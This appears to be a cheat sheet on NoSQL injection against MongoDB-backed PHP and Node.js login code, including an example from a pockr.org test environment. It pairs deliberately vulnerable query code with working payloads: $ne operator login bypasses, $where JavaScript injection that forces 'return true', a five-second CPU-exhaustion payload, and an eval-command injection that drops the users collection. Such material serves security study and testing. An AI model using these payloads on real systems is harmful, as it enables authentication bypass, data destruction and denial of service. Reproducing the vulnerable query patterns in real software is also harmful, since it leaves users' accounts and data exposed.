# **NoSQLi**

## **MongoDB**
```php
<?php
    $manager = new MongoDB\Driver\Manager("mongodb://mongo:27017");

    $dbUsername = null;
    $dbPassword = null;

    $data = array(
    'username' => $_REQUEST['username'],
    'password' => $_REQUEST['password']
    ); 

    $query = new MongoDB\Driver\Query($data);
    $cursor = $manager->executeQuery('test.users', $query)->toArray();
    $doc_failed = new DOMDocument();
    $doc_failed->loadHTMLFile("failed.html");
    $doc_succeed = new DOMDocument();
    $doc_succeed->loadHTMLFile("succeed.html");

    if(count($cursor)>0)
    {
        echo $doc_succeed->saveHTML();
    }
    else
    {
        echo $doc_failed->saveHTML();
    }
?>
```

```payload
username[$ne]=1&password[$ne]=1
//value[$ne]=1 become value=array($ne=>1)
```

Value search become compare search.

### $where
Cause `$where` before MongoDB 2.4 can exec javascript.

```sql
<?php
    $manager = new MongoDB\Driver\Manager("mongodb://mongo:27017");
    $query_body =array(
    '$where'=>"
    function q() {
    var username = ".$_REQUEST["username"].";
    var password = ".$_REQUEST["password"].";if(username == 'admin'&&password == '123456') return true; else{ return false;}}
    "); 
    $query = new MongoDB\Driver\Query($query_body);
    $cursor = $manager->executeQuery('test.users', $query)->toArray();
    $doc_failed = new DOMDocument();
    $doc_failed->loadHTMLFile("failed.html");
    $doc_succeed = new DOMDocument();
    $doc_succeed->loadHTMLFile("succeed.html");
    if(count($cursor)>0){
    echo $doc_succeed->saveHTML();
    }
    else{
    echo $doc_failed->saveHTML();
    }
?>
```

```payload
username=1&password=1;return true;
```

This cause return exec by `$where`.

Here's another payload can make MongoDB's CPU usage increase to the top about 5 secs.

```
username=1&password=1;(function(){var%20date%20=%20new%20Date();%20do{curDate%20=%20new%20Date();}while(curDate-date%3C5000);%20return%20Math.max();})();
```

### Mongo Shell

MongoDB provide the command shell, that cause problem if someone use it like following to implement a distinct() method ofr Mongo.

```php
<?php
    $manager = new MongoDB\Driver\Manager("mongodb://mongo:27017");
    $username = $_REQUEST['username'];
    $cmd = new MongoDB\Driver\Command([
    // build the 'distinct' command
    'eval'=> "db.users.distinct('username',{'username':'$username'})"
    ]);
    $cursor = $manager->executeCommand('test', $cmd)->toArray();
    var_dump($cursor);
    $doc_failed = new DOMDocument();
    $doc_failed->loadHTMLFile("failed.html");
    $doc_succeed = new DOMDocument();
    $doc_succeed->loadHTMLFile("succeed.html");
    if(count($cursor)>0){
    echo $doc_succeed->saveHTML();
    }
    else{
    echo $doc_failed->saveHTML();
    }
?>
```

In SQLinject aspect, it nearly provide hacker a Mongo shell without any WAF.

```payload
payload:username=2′});db.users.drop();db.user.find({‘username’:’2
```

## **Node.js**

```javascript
var express = require('express');
var mongoose = require('mongoose');
var bodyParser = require('body-parser');
mongoose.connect('mongodb://localhost/test', { useMongoClient: true });
var UserSchema = new mongoose.Schema({
    name: String,
    username: String,
    password: String
});
var User = mongoose.model('users', UserSchema);
var app = express();
app.set('views', __dirname);
app.set('view engine', 'jade');

app.get('/', function(req, res) {
    res.render('index', {});
});

app.use(bodyParser.json()); 

app.post('/', function(req, res) {
    console.log(req.body)
    User.findOne({username: req.body.username, password: req.body.password}, 
        function (err, user) {
            console.log(user)
            if (err) {
            return res.render('index', {message: err.message});
        }
        if (!user) {
            return res.render('index', {message: 'Sorry!'});
        }

        return res.render('index', {message: 'Welcome back ' + user.name + '!!!'});
    });
});

var server = app.listen(49090, function () {
    console.log('listening on port %d', server.address().port);
});
```

```payload
POST http://127.0.0.1:49090/
HTTP/1.1Content-Type: application/json{
"username": {"$ne": null},"password": {"$ne": null}}
```

## **NoSQL TestENV**
https://pockr.org/bug-environment/detail?environment_no=env_75b82b98ffedbe0035

```javascript=
function create(userParam) {
var deferred = Q.defer();
console.log('userParam.jobnumber',userParam.jobnumber);

// validation

if(userParam.username =="admin"){

deferred.reject('用户名 admin 不允许注册');
}
db.jobNumbers.findOne(
{ jobNumber: userParam.jobnumber },
function (err, user) {
if (err) deferred.reject(err.name + ': ' + err.message);console.log('user',user);
if (!user) {// jobnumber already existsdeferred.reject('工号 "' + userParam.jobnumber + '"不存在');
} else {
const jobNumberArray=['puokr001','puokr002','puokr003','puokr004','puokr005','puokr006','puokr007','puokr008','puokr009','puokr010','puokr011',];
if(jobNumberArray.indexOf(userParam.jobnumber)>=0){
deferred.reject('工号 "' + userParam.jobnumber + '"已被注册');
}

db.users.findOne(
{ username: userParam.username },
function (err, user) {
if (err) deferred.reject(err.name + ': ' + err.message);
if (user) {// username already existsdeferred.reject('用户名 "' + userParam.username + '" 已存在');
} else {
createUser();
}
});
}
});function createUser() {
// set user object to userParam without the cleartext password

var user = _.omit(userParam, ['password','jobnumber']);

// add hashed password to user object
user.hash = bcrypt.hashSync(userParam.password, 10);

db.users.insert(
user,
function (err, doc) {
if (err) deferred.reject(err.name + ': ' + err.message);

deferred.resolve();
});

createOwnServer();
}
```

```javascript=
db.jobNumbers.findOne(
{ jobNumber: userParam.jobnumber },function (err, user) {...})
```

```javascript=
{"username": "test","password": "111111","jobnumber": {"$ne": null}
```

```javascript=
function getServers(username){
var deferred = Q.defer();
db.servers.find({$where:"function(){return ((this.owners.indexOf('admin')<0 && this.owners.indexOf('"+username+"')>=0))|| this.owners.indexOf('public')>=0 }" }).toArray(
function (err, servers) {
if (err) deferred.reject(err.name + ': ' + err.message);console.log(servers);

deferred.resolve(servers);
});
return deferred.promise;
}
```

payload:
```
')>0|| this.owners.indexOf('admin
```
or
```
username":"summ3rf)))});//
```